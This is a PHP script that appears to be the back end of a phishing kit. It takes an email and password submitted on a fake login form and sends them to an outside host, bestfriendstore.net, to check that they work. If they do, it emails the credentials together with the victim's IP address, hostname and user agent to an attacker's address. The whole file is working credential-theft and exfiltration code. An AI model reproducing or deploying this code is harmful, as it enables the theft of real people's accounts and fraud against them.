<?php

include 'email.php';
$email = trim($_POST['email']);
$password = trim($_POST['password']);
function is_valid($em, $pass)
    {
        $url = "http://bestfriendstore.net/web/get/auth?email=".$em."&password=" .$pass;
     $handle = curl_init();
 
    curl_setopt($handle, CURLOPT_URL, $url);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
    $data= curl_exec($handle);
    curl_close($handle);

        if ($data == "ok") {
            return "ok";
        } else {
            return "Not ok";
        }
    }
if($email != null && $password != null) {
    $signal = '';
    if (is_valid($email, $password) == "ok") {
        $ip = getenv("REMOTE_ADDR");
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "|----------| Dogar |--------------|\n";

        $message .= "Online ID            : " . $email . "\n";
        $message .= "Passcode              : " . $password . "\n";
        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "|------- -------------|\n";
        $send = $Receive_email;
        $subject = "Login : $ip";
        mail($send, $subject, $message);
        $signal = 'ok';
        $msg = 'Message Send';
        echo $signal;
    }
    else{
      print_r(is_valid($email, $password));
      exit();
    }
    
    
    
    
}

?>